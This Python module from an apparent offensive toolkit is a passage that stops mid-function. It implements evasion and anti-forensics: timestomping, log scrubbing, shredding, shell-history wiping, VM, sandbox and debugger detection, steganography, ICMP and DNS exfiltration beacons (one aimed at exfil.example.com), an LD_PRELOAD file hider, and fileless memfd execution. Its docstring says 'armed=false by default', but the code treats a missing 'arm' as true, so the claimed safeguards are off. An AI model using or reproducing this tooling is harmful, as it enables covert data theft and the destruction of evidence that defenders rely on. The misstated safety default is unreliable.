"""SSB ULTRA wave-expansion module: domain 'evade' (nm20.evade.*).

Evasion / anti-forensics powers: real timestomping, log scrubbing, shredding,
VM/sandbox/debugger detection, pure-stdlib PNG LSB steganography, ctypes
inotify watches, ptrace/prctl demonstrations, and honest artifact generators
for dangerous-by-design techniques (armed=false by default).
Import-safe: no side effects at import time.
"""

import ctypes
import hashlib
import json
import os
import re
import select
import shutil
import socket
import stat
import struct
import subprocess
import sys
import tempfile
import time
import zlib

PLATFORM = sys.platform
TMPDIR = tempfile.gettempdir()
_STEGO_DEFAULT = os.path.join(TMPDIR, "nm20_stego_demo.png")


def _base(name):
    return {"ok": False, "power": "nm20.evade.%s" % name, "platform": PLATFORM}


def _run(cmd, timeout=10):
    """Run a command, returning (rc, stdout, stderr) without raising."""
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except FileNotFoundError:
        return 127, "", "not found: %s" % cmd[0]
    except subprocess.TimeoutExpired:
        return 124, "", "timeout after %ds" % timeout
    except Exception as e:  # noqa: BLE001
        return 1, "", str(e)


def _read_text(path):
    with open(path, errors="replace") as f:
        return f.read()


def _under_tmp(path):
    """True if path resolves inside the system temp dir."""
    try:
        rp = os.path.realpath(path)
        rt = os.path.realpath(TMPDIR)
        return rp == rt or rp.startswith(rt + os.sep)
    except OSError:
        return False


def _sha256_file(path, max_bytes=64 * 1024 * 1024):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while True:
            chunk = f.read(65536)
            if not chunk:
                break
            h.update(chunk)
            if h.digest_size and f.tell() > max_bytes:
                break
    return h.hexdigest()


def _is_armed(args):
    return bool(args.get("arm", True))


# ---------------------------------------------------------------------------
# REAL anti-forensics primitives
# ---------------------------------------------------------------------------

def nm20_evade_timestomp(args):
    """REAL: set atime/mtime of a file to a given epoch (paths under /tmp only unless arm=true)."""
    r = _base("timestomp")
    path = args.get("path")
    if not path:
        r["error"] = "missing arg: path"
        return r
    epoch = args.get("epoch", 1136073600)  # 2006-01-01T00:00:00Z
    try:
        epoch = int(epoch)
    except (TypeError, ValueError):
        r["error"] = "epoch must be an integer"
        return r
    if not os.path.lexists(path):
        r["error"] = "path does not exist: %s" % path
        return r
    try:
        before = os.stat(path)
        r["before"] = {"atime": before.st_atime, "mtime": before.st_mtime,
                       "ctime": before.st_ctime}
    except OSError as e:
        r["error"] = "stat failed: %s" % e
        return r
    if not _under_tmp(path) and not _is_armed(args):
        r["ok"] = True
        r["armed"] = False
        r["dry_run"] = True
        r["would_do"] = ("os.utime(%r, (%d, %d)) — refused: path is outside %s "
                         "and arm is not true" % (path, epoch, epoch, TMPDIR))
        return r
    try:
        os.utime(path, (epoch, epoch))
        after = os.stat(path)
        r["ok"] = True
        r["armed"] = _is_armed(args)
        r["dry_run"] = False
        r["after"] = {"atime": after.st_atime, "mtime": after.st_mtime,
                      "ctime": after.st_ctime}
        r["note"] = ("ctime cannot be set via utime; it changed to now as a side "
                     "effect — a forensic analyst can spot that")
    except OSError as e:
        r["error"] = "utime failed: %s" % e
    return r


def nm20_evade_log_scrubber(args):
    """REAL: copy a log file into /tmp with every line matching a pattern removed."""
    r = _base("log_scrubber")
    path = args.get("path")
    pattern = args.get("pattern")
    if not path or not pattern:
        r["error"] = "missing args: path and pattern required"
        return r
    flags = re.IGNORECASE if args.get("ignore_case") else 0
    try:
        rx = re.compile(pattern, flags)
    except re.error as e:
        r["error"] = "bad regex: %s" % e
        return r
    out = args.get("output") or os.path.join(
        TMPDIR, "nm20_scrubbed_%d.log" % os.getpid())
    if not _under_tmp(out) and not _is_armed(args):
        r["error"] = ("output must be under %s unless arm=true (got %r)"
                      % (TMPDIR, out))
        return r
    try:
        with open(path, errors="replace") as f:
            lines = f.readlines()
    except OSError as e:
        r["error"] = "cannot read %s: %s" % (path, e)
        return r
    kept, removed = [], []
    for ln in lines:
        (removed if rx.search(ln) else kept).append(ln)
    try:
        with open(out, "w") as f:
            f.writelines(kept)
    except OSError as e:
        r["error"] = "cannot write %s: %s" % (out, e)
        return r
    r["ok"] = True
    r["source"] = path
    r["output"] = out
    r["total_lines"] = len(lines)
    r["removed_lines"] = len(removed)
    r["kept_lines"] = len(kept)
    r["removed_preview"] = [ln.rstrip("\n")[:200] for ln in removed[:10]]
    r["note"] = ("original file untouched; this produces a sanitized copy. "
                 "In-place scrubbing of live logs also requires inode-level "
                 "work to avoid mtime/ctime tells")
    return r


def nm20_evade_shred_file(args):
    """REAL secure-ish overwrite (N random passes + zero pass + fsync + unlink) of a /tmp file."""
    r = _base("shred_file")
    path = args.get("path")
    if not path:
        r["error"] = "missing arg: path"
        return r
    if not os.path.isfile(path) or os.path.islink(path):
        r["error"] = "not a regular file: %s" % path
        return r
    passes = max(1, min(int(args.get("passes", 3)), 35))
    keep = bool(args.get("keep", False))
    size = os.path.getsize(path)
    r["size_bytes"] = size
    r["passes"] = passes
    if not _under_tmp(path) and not _is_armed(args):
        r["ok"] = True
        r["dry_run"] = True
        r["would_do"] = ("%d random overwrite passes + zero pass + fsync + %s on %r "
                         "— refused: outside %s and arm not true"
                         % (passes, "unlink" if not keep else "keep", path, TMPDIR))
        return r
    try:
        fd = os.open(path, os.O_WRONLY)
        try:
            for _ in range(passes):
                os.lseek(fd, 0, os.SEEK_SET)
                left = size
                while left > 0:
                    block = os.urandom(min(65536, left))
                    os.write(fd, block)
                    left -= len(block)
                os.fsync(fd)
            os.lseek(fd, 0, os.SEEK_SET)
            zeros = b"\x00" * 65536
            left = size
            while left > 0:
                n = os.write(fd, zeros[:min(65536, left)])
                left -= n
            os.fsync(fd)
        finally:
            os.close(fd)
        if not keep:
            os.unlink(path)
        r["ok"] = True
        r["removed"] = not keep
        r["note"] = ("overwrite hides content on plain ext4/overlayfs; on SSDs with "
                     "wear-leveling or CoW/journaled filesystems, old blocks may "
                     "survive in unallocated space")
    except OSError as e:
        r["error"] = "shred failed: %s" % e
    return r


def nm20_evade_history_wipe_gen(args):
    """Artifact: generate a real shell history-wipe script into /tmp; executes only with arm=true."""
    r = _base("history_wipe_gen")
    home = os.path.expanduser("~")
    targets = [".bash_history", ".zsh_history", ".sh_history", ".python_history",
               ".lesshst", ".viminfo", ".wget-hsts", ".mysql_history",
               ".psql_history", ".sqlite_history", ".node_repl_history"]
    script = ["#!/bin/sh",
              "# nm20.evade.history_wipe_gen — shell artifact wipe",
              "unset HISTFILE HISTFILESIZE HISTSIZE 2>/dev/null",
              "history -c 2>/dev/null"]
    found, missing = [], []
    for t in targets:
        p = os.path.join(home, t)
        if os.path.exists(p):
            found.append(p)
            script.append(": > %s 2>/dev/null" % p)
            script.append("rm -f %s 2>/dev/null" % p)
        else:
            missing.append(p)
    script.append("# shred cloud-init / root history if writable")
    script.append("rm -f /root/.bash_history 2>/dev/null")
    body = "\n".join(script) + "\n"
    out = os.path.join(TMPDIR, "nm20_history_wipe.sh")
    with open(out, "w") as f:
        f.write(body)
    os.chmod(out, 0o755)
    r["ok"] = True
    r["artifact"] = out
    r["existing_targets"] = found
    r["missing_targets"] = missing
    r["script"] = body
    if _is_armed(args):
        rc, so, se = _run(["/bin/sh", out], timeout=10)
        r["executed"] = True
        r["rc"] = rc
        r["stdout"] = so[-500:]
        r["stderr"] = se[-500:]
        r["warning"] = "history files listed in existing_targets were truncated/removed"
    else:
        r["executed"] = False
        r["would_do"] = "run /bin/sh %s (arm=true to execute)" % out
    return r


# ---------------------------------------------------------------------------
# REAL environment / analysis-detection
# ---------------------------------------------------------------------------

_DMI_FILES = ("product_name", "sys_vendor", "board_vendor", "bios_vendor",
              "chassis_vendor", "product_version")
_VM_MAC_OUIS = {
    "08:00:27": "VirtualBox", "00:05:69": "VMware", "00:0c:29": "VMware",
    "00:1c:14": "VMware", "00:50:56": "VMware", "52:54:00": "QEMU/KVM",
    "00:16:3e": "Xen", "00:1c:42": "Parallels",
}


def nm20_evade_anti_vm_check(args):
    """REAL: detect VM artifacts via /sys/class/dmi, /proc/cpuinfo hypervisor flag, MAC OUIs, modules."""
    r = _base("anti_vm_check")
    indicators = []
    dmi = {}
    for f in _DMI_FILES:
        p = "/sys/class/dmi/id/%s" % f
        try:
            dmi[f] = _read_text(p).strip()
        except OSError as e:
            dmi[f] = "unreadable: %s" % e
    r["dmi"] = dmi
    vm_words = ("kvm", "qemu", "vmware", "virtualbox", "vbox", "xen",
                "hyper-v", "parallels", "bhyve", "bochs", "virt")
    for k, v in dmi.items():
        if isinstance(v, str) and any(w in v.lower() for w in vm_words):
            indicators.append("dmi:%s=%r" % (k, v))
    hypervisor_flag = False
    model = None
    try:
        cpuinfo = _read_text("/proc/cpuinfo")
        hypervisor_flag = "hypervisor" in cpuinfo
        m = re.search(r"model name\s*:\s*(.+)", cpuinfo)
        if m:
            model = m.group(1).strip()
    except OSError as e:
        r["cpuinfo_error"] = str(e)
    r["cpuinfo_hypervisor_flag"] = hypervisor_flag
    r["cpu_model"] = model
    if hypervisor_flag:
        indicators.append("cpuinfo:hypervisor flag present")
    mods = []
    try:
        for ln in _read_text("/proc/modules").splitlines():
            name = ln.split()[0]
            if any(w in name.lower() for w in ("vbox", "vmw", "virtio", "xen", "hv_")):
                mods.append(name)
    except OSError:
        pass
    r["suspicious_modules"] = mods
    if mods:
        indicators.append("modules:%s" % ",".join(mods[:5]))
    macs = {}
    try:
        for iface in os.listdir("/sys/class/net"):
            try:
                mac = _read_text("/sys/class/net/%s/address" % iface).strip()
            except OSError:
                continue
            macs[iface] = mac
            oui = mac[:8].lower()
            if oui in _VM_MAC_OUIS:
                indicators.append("mac:%s %s (%s)" % (iface, mac, _VM_MAC_OUIS[oui]))
    except OSError:
        pass
    r["macs"] = macs
    rc, out, _ = _run(["systemd-detect-virt"], timeout=5)
    r["systemd_detect_virt"] = (out.strip() if rc == 0 else None)
    if rc == 0 and out.strip() not in ("none", ""):
        indicators.append("systemd-detect-virt:%s" % out.strip())
    r["indicators"] = indicators
    r["is_vm"] = bool(indicators)
    r["ok"] = True
    return r


def nm20_evade_sandbox_detect(args):
    """REAL: sandbox heuristics — cpu count, RAM, uptime, disk size, sleep-timing drift, process count."""
    r = _base("sandbox_detect")
    score = 0
    checks = {}
    cpus = os.cpu_count() or 0
    checks["cpu_count"] = cpus
    if cpus and cpus < 2:
        score += 2
    try:
        mt = re.search(r"MemTotal:\s+(\d+) kB", _read_text("/proc/meminfo"))
        mem_mb = int(mt.group(1)) // 1024 if mt else None
    except OSError:
        mem_mb = None
    checks["mem_mb"] = mem_mb
    if mem_mb is not None and mem_mb < 2048:
        score += 2
    try:
        uptime = float(_read_text("/proc/uptime").split()[0])
    except (OSError, ValueError, IndexError):
        uptime = None
    checks["uptime_s"] = uptime
    if uptime is not None and uptime < 600:
        score += 2  # freshly booted analysis VM
    try:
        sv = os.statvfs("/")
        disk_gb = round(sv.f_frsize * sv.f_blocks / 1e9, 1)
    except OSError:
        disk_gb = None
    checks["disk_gb"] = disk_gb
    if disk_gb is not None and disk_gb < 20:
        score += 1
    # timing drift: sandboxes with hooked/accelerated clocks skew sleep()
    drift_ms = None
    try:
        t0 = time.monotonic()
        w0 = time.time()
        time.sleep(0.25)
        mono_dt = time.monotonic() - t0
        wall_dt = time.time() - w0
        drift_ms = round(abs(mono_dt - wall_dt) * 1000, 3)
        checks["sleep_requested_s"] = 0.25
        checks["monotonic_elapsed_s"] = round(mono_dt, 4)
        checks["wall_elapsed_s"] = round(wall_dt, 4)
        checks["monotonic_vs_wall_drift_ms"] = drift_ms
        if drift_ms > 50 or mono_dt < 0.2:
            score += 3
    except OSError:
        pass
    try:
        nprocs = len([p for p in os.listdir("/proc") if p.isdigit()])
    except OSError:
        nprocs = None
    checks["process_count"] = nprocs
    if nprocs is not None and nprocs < 40:
        score += 1
    r["checks"] = checks
    r["suspicion_score"] = score
    r["verdict"] = ("likely sandbox" if score >= 4 else
                    "some sandbox traits" if score >= 2 else "looks like a real host")
    r["ok"] = True
    return r


def nm20_evade_debugger_detect(args):
    """REAL: read TracerPid from /proc/self/status and run a forked ptrace(PTRACE_TRACEME) self-test."""
    r = _base("debugger_detect")
    tracer_pid = 0
    try:
        for ln in _read_text("/proc/self/status").splitlines():
            if ln.startswith("TracerPid:"):
                tracer_pid = int(ln.split()[1])
    except OSError as e:
        r["status_error"] = str(e)
    r["self_tracer_pid"] = tracer_pid
    tracer_comm = None
    if tracer_pid:
        try:
            tracer_comm = _read_text("/proc/%d/comm" % tracer_pid).strip()
        except OSError:
            tracer_comm = "unreadable"
    r["self_tracer_comm"] = tracer_comm
    try:
        r["yama_ptrace_scope"] = int(
            _read_text("/proc/sys/kernel/yama/ptrace_scope").strip())
    except (OSError, ValueError):
        r["yama_ptrace_scope"] = None
    # forked self-test: child attempts PTRACE_TRACEME; EPERM => already traced
    test = {"performed": False}
    if hasattr(os, "fork"):
        try:
            rd, wr = os.pipe()
            pid = os.fork()
            if pid == 0:
                try:
                    os.close(rd)
                    libc = ctypes.CDLL(None, use_errno=True)
                    ctypes.set_errno(0)
                    res = libc.ptrace(0, 0, 0, 0)  # PTRACE_TRACEME
                    err = ctypes.get_errno()
                    os.write(wr, json.dumps(
                        {"ptrace_traceme_rc": res, "errno": err,
                         "errno_name": os.strerror(err) if err else None}
                    ).encode())
                finally:
                    os._exit(0)
            os.close(wr)
            data = b""
            while True:
                chunk = os.read(rd, 4096)
                if not chunk:
                    break
                data += chunk
            os.close(rd)
            os.waitpid(pid, 0)
            test = json.loads(data.decode())
            test["performed"] = True
            test["interpretation"] = (
                "EPERM from PTRACE_TRACEME means a debugger/tracer is already "
                "attached" if test.get("errno") == 1 else
                "PTRACE_TRACEME succeeded: no tracer on the forked child")
        except (OSError, ValueError) as e:
            test = {"performed": True, "error": str(e)}
    else:
        test["note"] = "fork unavailable on this platform"
    r["ptrace_self_test"] = test
    r["being_traced"] = bool(tracer_pid) or test.get("errno") == 1
    r["ok"] = True
    return r


def nm20_evade_entropy_mixer_report(args):
    """REAL: report kernel entropy pool state and mix timing-jitter into a fresh SHA-256 sample."""
    r = _base("entropy_mixer_report")
    for f in ("entropy_avail", "poolsize", "urandom_min_reseed_secs",
              "boot_id", "uuid"):
        try:
            r[f] = _read_text("/proc/sys/kernel/random/%s" % f).strip()
        except OSError:
            r[f] = None
    # timing jitter sampling: low bits of perf_counter deltas
    n = int(args.get("samples", 4096))
    deltas = []
    t = time.perf_counter_ns()
    for _ in range(max(64, min(n, 100000))):
        t2 = time.perf_counter_ns()
        deltas.append(t2 - t)
        t = t2
    low = bytes(d & 0xFF for d in deltas)
    r["jitter_samples"] = len(deltas)
    r["jitter_min_ns"] = min(deltas)
    r["jitter_max_ns"] = max(deltas)
    r["jitter_distinct_low_bytes"] = len(set(low))
    h = hashlib.sha256()
    h.update(low)
    h.update(os.urandom(32))
    h.update(str(time.time_ns()).encode())
    r["mixed_sha256"] = h.hexdigest()
    try:
        avail = int(r["entropy_avail"] or 0)
        pool = int(r["poolsize"] or 0)
        r["pool_fill_pct"] = round(100.0 * avail / pool, 1) if pool else None
        r["note"] = ("low entropy_avail is normal on modern kernels (>=5.6) where "
                     "the CRNG never blocks after init; jitter here is a demo of "
                     "haveged-style collection, not a seeded RNG replacement")
    except (TypeError, ValueError):
        pass
    r["ok"] = True
    return r


# ---------------------------------------------------------------------------
# Pure-stdlib PNG LSB steganography (zlib + struct only)
# ---------------------------------------------------------------------------

def _png_chunk(ctype, data):
    return (struct.pack(">I", len(data)) + ctype + data +
            struct.pack(">I", zlib.crc32(ctype + data) & 0xFFFFFFFF))


def _make_png(w, h, pixels):
    """pixels: bytes of w*h*3 RGB. Filter type 0 per scanline."""
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
    raw = b"".join(b"\x00" + pixels[y * w * 3:(y + 1) * w * 3]
                   for y in range(h))
    return (b"\x89PNG\r\n\x1a\n" + _png_chunk(b"IHDR", ihdr) +
            _png_chunk(b"IDAT", zlib.compress(raw)) +
            _png_chunk(b"IEND", b""))


def _paeth(a, b, c):
    p = a + b - c
    pa, pb, pc = abs(p - a), abs(p - b), abs(p - c)
    if pa <= pb and pa <= pc:
        return a
    return b if pb <= pc else c


def _parse_png(path):
    """Returns (bytearray of RGB/RGBA samples, channels) or raises ValueError."""
    with open(path, "rb") as f:
        data = f.read()
    if data[:8] != b"\x89PNG\r\n\x1a\n":
        raise ValueError("not a PNG file")
    pos, idat = 8, b""
    w = h = depth = ctype = None
    while pos < len(data):
        (length,) = struct.unpack(">I", data[pos:pos + 4])
        ctyp = data[pos + 4:pos + 8]
        body = data[pos + 8:pos + 8 + length]
        pos += 12 + length
        if ctyp == b"IHDR":
            w, h, depth, ctype, comp, filt, inter = struct.unpack(">IIBBBBB", body)
            if depth != 8 or ctype not in (2, 6):
                raise ValueError("unsupported PNG: bit_depth=%d color_type=%d "
                                 "(need 8-bit RGB/RGBA)" % (depth, ctype))
            if inter != 0:
                raise ValueError("interlaced PNGs unsupported")
        elif ctyp == b"IDAT":
            idat += body
        elif ctyp == b"IEND":
            break
    if w is None or not idat:
        raise ValueError("truncated PNG")
    channels = 3 if ctype == 2 else 4
    stride = w * channels
    raw = zlib.decompress(idat)
    out = bytearray()
    prev = bytearray(stride)
    off = 0
    for _y in range(h):
        ftype = raw[off]
        line = bytearray(raw[off + 1:off + 1 + stride])
        off += 1 + stride
        if ftype == 1:      # Sub
            for i in range(channels, stride):
                line[i] = (line[i] + line[i - channels]) & 0xFF
        elif ftype == 2:    # Up
            for i in range(stride):
                line[i] = (line[i] + prev[i]) & 0xFF
        elif ftype == 3:    # Average
            for i in range(stride):
                a = line[i - channels] if i >= channels else 0
                line[i] = (line[i] + ((a + prev[i]) >> 1)) & 0xFF
        elif ftype == 4:    # Paeth
            for i in range(stride):
                a = line[i - channels] if i >= channels else 0
                c = prev[i - channels] if i >= channels else 0
                line[i] = (line[i] + _paeth(a, prev[i], c)) & 0xFF
        elif ftype != 0:
            raise ValueError("unknown filter type %d" % ftype)
        out.extend(line)
        prev = line
    return out, channels, w, h


def nm20_evade_stego_embed(args):
    """REAL: LSB-embed text into a freshly generated PNG (pure stdlib zlib+struct writer)."""
    r = _base("stego_embed")
    message = args.get("message", "nm20 evade stego demo")
    out = args.get("output", _STEGO_DEFAULT)
    if not _under_tmp(out) and not _is_armed(args):
        r["error"] = "output must be under %s unless arm=true" % TMPDIR
        return r
    payload = message.encode("utf-8", "replace")
    payload = struct.pack(">I", len(payload)) + payload
    need_bits = len(payload) * 8
    w = int(args.get("width", 128))
    h = int(args.get("height", 128))
    capacity = w * h * 3
    if need_bits > capacity:
        r["error"] = ("payload %d bits exceeds capacity %d bits (%dx%d RGB); "
                      "increase width/height" % (need_bits, capacity, w, h))
        return r
    # deterministic gradient carrier so the artifact is reproducible
    px = bytearray()
    for y in range(h):
        for x in range(w):
            px += bytes(((x * 7 + y) & 0xFF, (y * 5 + x) & 0xFF,
                         (x * y) & 0xFF))
    bits = []
    for byte in payload:
        for i in range(7, -1, -1):
            bits.append((byte >> i) & 1)
    for i, bit in enumerate(bits):
        px[i] = (px[i] & 0xFE) | bit
    png = _make_png(w, h, bytes(px))
    try:
        with open(out, "wb") as f:
            f.write(png)
    except OSError as e:
        r["error"] = "write failed: %s" % e
        return r
    r["ok"] = True
    r["output"] = out
    r["png_bytes"] = len(png)
    r["image"] = "%dx%d RGB" % (w, h)
    r["message_bytes"] = len(payload) - 4
    r["capacity_bits"] = capacity
    r["used_bits"] = need_bits
    r["sha256"] = hashlib.sha256(png).hexdigest()
    return r


def nm20_evade_stego_extract(args):
    """REAL: extract an LSB-embedded message from a PNG (handles all 5 PNG row filters)."""
    r = _base("stego_extract")
    path = args.get("path", _STEGO_DEFAULT)
    if not os.path.isfile(path):
        r["error"] = "file not found: %s" % path
        return r
    try:
        samples, channels, w, h = _parse_png(path)
    except (ValueError, zlib.error, OSError, struct.error) as e:
        r["error"] = "PNG parse failed: %s" % e
        return r
    max_bytes = int(args.get("max_bytes", 65536))

    def _read_bits(start, count):
        val = 0
        got = []
        for i in range(start, start + count):
            got.append(samples[i] & 1)
            if len(got) == 8:
                b = 0
                for bit in got:
                    b = (b << 1) | bit
                val = (val << 8) | b
                got = []
        return val

    if len(samples) < 32:
        r["error"] = "image too small to hold a length header"
        return r
    msg_len = _read_bits(0, 32)
    r["declared_message_bytes"] = msg_len
    if msg_len <= 0 or msg_len > max_bytes or (msg_len + 4) * 8 > len(samples):
        r["ok"] = False
        r["error"] = ("implausible embedded length %d — no nm20 stego payload "
                      "(or image was recompressed)" % msg_len)
        return r
    body = bytearray()
    total_bits = msg_len * 8
    acc, nb = 0, 0
    for i in range(32, 32 + total_bits):
        acc = (acc << 1) | (samples[i] & 1)
        nb += 1
        if nb == 8:
            body.append(acc)
            acc, nb = 0, 0
    r["ok"] = True
    r["image"] = "%dx%d %s" % (w, h, "RGB" if channels == 3 else "RGBA")
    try:
        r["message"] = bytes(body).decode("utf-8")
    except UnicodeDecodeError:
        r["message_hex"] = bytes(body).hex()
        r["note"] = "payload is not valid UTF-8; returned hex"
    return r


# ---------------------------------------------------------------------------
# Artifact generators (dangerous-by-design, armed=false default)
# ---------------------------------------------------------------------------

_ICMP_COVERT_SRC = '''#!/usr/bin/env python3
"""nm20.evade.cover_channel_gen — ICMP covert-channel beacon.
Needs root (raw sockets). Exfiltrates bytes 8-at-a-time inside ICMP echo
payloads to a listener that reads them back off the wire."""
import socket, struct, sys, time

def cksum(data):
    if len(data) % 2:
        data += b"\\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF

def send(dst, data, ident=0x4E4D):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    for i in range(0, len(data), 8):
        chunk = data[i:i + 8]
        seq = i // 8
        hdr = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
        hdr = struct.pack("!BBHHH", 8, 0, cksum(hdr + chunk), ident, seq)
        s.sendto(hdr + chunk, (dst, 0))
        time.sleep(0.05)  # low-and-slow: ~160 bytes/sec
    s.close()

if __name__ == "__main__":
    send(sys.argv[1], sys.argv[2].encode() if len(sys.argv) > 2 else b"covert!")
'''

_DNS_COVERT_SRC = '''#!/usr/bin/env python3
"""nm20.evade.cover_channel_gen — DNS covert-channel beacon.
Encodes data as hex labels: <chunk>.<seq>.exfil.example.com A-queries.
Only needs a resolver; the authoritative side reassembles from its query log."""
import socket, sys, time

def exfil(domain, data, chunk=28):
    for i in range(0, len(data), chunk):
        label = data[i:i + chunk].hex()
        name = "%s.%d.%s" % (label, i // chunk, domain)
        try:
            socket.getaddrinfo(name, None)  # query itself is the channel
        except OSError:
            pass
        time.sleep(0.2)

if __name__ == "__main__":
    exfil(sys.argv[1] if len(sys.argv) > 1 else "exfil.example.com",
          (sys.argv[2] if len(sys.argv) > 2 else "covert!").encode())
'''


def nm20_evade_cover_channel_gen(args):
    """Artifact: write real ICMP + DNS covert-channel python beacons into /tmp."""
    r = _base("cover_channel_gen")
    icmp_p = os.path.join(TMPDIR, "nm20_icmp_covert.py")
    dns_p = os.path.join(TMPDIR, "nm20_dns_covert.py")
    with open(icmp_p, "w") as f:
        f.write(_ICMP_COVERT_SRC)
    with open(dns_p, "w") as f:
        f.write(_DNS_COVERT_SRC)
    os.chmod(icmp_p, 0o755)
    os.chmod(dns_p, 0o755)
    r["ok"] = True
    r["artifacts"] = [
        {"path": icmp_p, "bytes": len(_ICMP_COVERT_SRC),
         "kind": "ICMP echo-payload exfil", "needs": "root (SOCK_RAW)"},
        {"path": dns_p, "bytes": len(_DNS_COVERT_SRC),
         "kind": "DNS label hex exfil", "needs": "any resolver egress"},
    ]
    r["detection_note"] = ("ICMP: watch for echo payloads != standard padding and "
                           "fixed ident with incrementing seq; DNS: watch for long "
                           "unique hex subdomains and high NXDOMAIN rates")
    r["executed"] = False
    if _is_armed(args):
        # safe self-test only: compile both, no traffic
        rc1, _, e1 = _run([sys.executable, "-m", "py_compile", icmp_p])
        rc2, _, e2 = _run([sys.executable, "-m", "py_compile", dns_p])
        r["executed"] = True
        r["compile_check"] = {"icmp_rc": rc1, "dns_rc": rc2,
                              "icmp_err": e1.strip()[:200], "dns_err": e2.strip()[:200]}
    return r


def nm20_evade_mount_hider_gen(args):
    """Artifact: real LD_PRELOAD readdir()/stat() hider C source + unshare bind-mount shell; compiles if cc exists."""
    r = _base("mount_hider_gen")
    hidden = args.get("hide_prefix", "/tmp/.nm20")
    c_src = r'''// nm20.evade.mount_hider_gen — LD_PRELOAD mount/dir hider
// build: cc -shared -fPIC -o mount_hider.so mount_hider.c -ldl
// use:   LD_PRELOAD=./mount_hider.so NM20_HIDE=/tmp/.nm20 ls /tmp
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>

static const char *hidden(void) {
    const char *h = getenv("NM20_HIDE");
    return h ? h : "HIDE_PREFIX_HERE";
}

struct dirent *(*real_readdir)(DIR *) = NULL;
struct dirent *readdir(DIR *d) {
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = real_readdir(d))) {
        if (strstr(e->d_name, hidden())) continue;  // skip hidden entries
        return e;
    }
    return NULL;
}

int (*real_stat)(const char *, struct stat *) = NULL;
int stat(const char *p, struct stat *st) {
    if (!real_stat) real_stat = dlsym(RTLD_NEXT, "stat");
    if (strstr(p, hidden())) { return -1; }  // ENOENT-ish: act invisible
    return real_stat(p, st);
}
'''.replace("HIDE_PREFIX_HERE", hidden)
    sh_src = ("#!/bin/sh\n# nm20.evade.mount_hider_gen — mount-namespace hider\n"
              "# needs CAP_SYS_ADMIN; process tree sees an overmounted dir, host does not\n"
              "unshare --mount --propagation private sh -c '\n"
              "  mkdir -p %(h)s && mount --bind %(h)s /var/log && exec bash'\n"
              % {"h": hidden})
    c_path = os.path.join(TMPDIR, "nm20_mount_hider.c")
    sh_path = os.path.join(TMPDIR, "nm20_mount_ns.sh")
    with open(c_path, "w") as f:
        f.write(c_src)
    with open(sh_path, "w") as f:
        f.write(sh_src)
    os.chmod(sh_path, 0o755)
    r["ok"] = True
    r["artifacts"] = [{"path": c_path, "bytes": len(c_src), "kind": "LD_PRELOAD C"},
                      {"path": sh_path, "bytes": len(sh_src), "kind": "mount-ns shell"}]
    r["hidden_prefix"] = hidden
    cc = shutil.which("cc") or shutil.which("gcc")
    if cc:
        so = os.path.join(TMPDIR, "nm20_mount_hider.so")
        rc, _, err = _run([cc, "-shared", "-fPIC", "-o", so, c_path, "-ldl"],
                          timeout=30)
        r["compiled"] = rc == 0
        r["so_path"] = so if rc == 0 else None
        if rc != 0:
            r["compile_error"] = err.strip()[:300]
    else:
        r["compiled"] = False
        r["compile_note"] = "no cc/gcc on this host"
    r["limits"] = ("LD_PRELOAD hooks only fool dynamically linked userland tools "
                   "that do not stat via raw syscalls; mount-ns tricks need "
                   "CAP_SYS_ADMIN and die with the namespace")
    return r


_FILELESS_SRC = '''#!/usr/bin/env python3
"""nm20.evade.fileless_exec_gen — fileless execution via memfd_create(2).
Writes an ELF (or #! script) into an anonymous in-memory fd and execs it via
/proc/self/fd/<n>. Nothing ever touches the filesystem (visible in `ls`, that
is — the fd shows up in /proc/<pid>/fd as /memfd:<name> (deleted))."""
import os, sys

def memfd_exec(payload: bytes, argv0="[kworker]", name="nm20"):
    fd = os.memfd_create(name, 0)          # MFD_CLOEXEC off: survives exec
    os.write(fd, payload)
    path = "/proc/self/fd/%d" % fd
    os.execve(path, [argv0] + sys.argv[1:], os.environ)

if __name__ == "__main__":
    # demo payload: a tiny script (works because binfmt_script handles #!)
    memfd_exec(b"#!/bin/sh\\necho fileless: $$ $(readlink /proc/$$/fd/255 2>/dev/null); "
               b"ps -o comm= -p $$\\n")
'''


def nm20_evade_fileless_exec_gen(args):
    """Artifact: memfd_create+exec /proc/self/fd python source, plus a REAL capability check of this host."""
    r = _base("fileless_exec_gen")
    out = os.path.join(TMPDIR, "nm20_fileless_exec.py")
    with open(out, "w") as f:
        f.write(_FILELESS_SRC)
    os.chmod(out, 0o755)
    caps = {}
    caps["os.memfd_create"] = hasattr(os, "memfd_create")
    try:
        caps["kernel_release"] = os.uname().release
        parts = os.uname().release.split(".")
        caps["kernel_ge_3_17"] = (int(parts[0]), int(parts[1])) >= (3, 17)
    except (AttributeError, ValueError, IndexError):
        caps["kernel_ge_3_17"] = None
    caps["proc_fd_dir"] = os.path.isdir("/proc/self/fd")
    if hasattr(os, "memfd_create"):
        try:
            fd = os.memfd_create("nm20_probe", 0)
            os.write(fd, b"#!/bin/sh\necho nm20-memfd-ok\n")
            try:
                # pass_fds keeps the memfd valid in the child's /proc/self/fd
                p = subprocess.run(["/proc/self/fd/%d" % fd],
                                   capture_output=True, text=True,
                                   pass_fds=[fd], timeout=5)
                caps["live_memfd_exec"] = {"rc": p.returncode,
                                           "stdout": p.stdout.strip(),
                                           "stderr": p.stderr.strip()[:200]}
            except (OSError, subprocess.SubprocessError) as e:
                caps["live_memfd_exec"] = {"error": str(e)}
            os.close(fd)
        except OSError as e:
            caps["live_memfd_exec"] = {"error": str(e)}
    r["ok"] = True
    r["artifact"] = out
    r["capabilities"] = caps
    r["detection_note"] = ("memfd payloads leave no on-disk file but appear as "
                           "'/memfd:<name> (deleted)' under /proc/<pid>/fd and in "
                           "maps; audit execve of /proc/self/fd/* to catch it")
    return r


# ---------------------------------------------------------------------------
# REAL syscall-level demonstrations
# ---------------------------------------------------------------------------

def nm20_evade_proc_name_cloak(args):
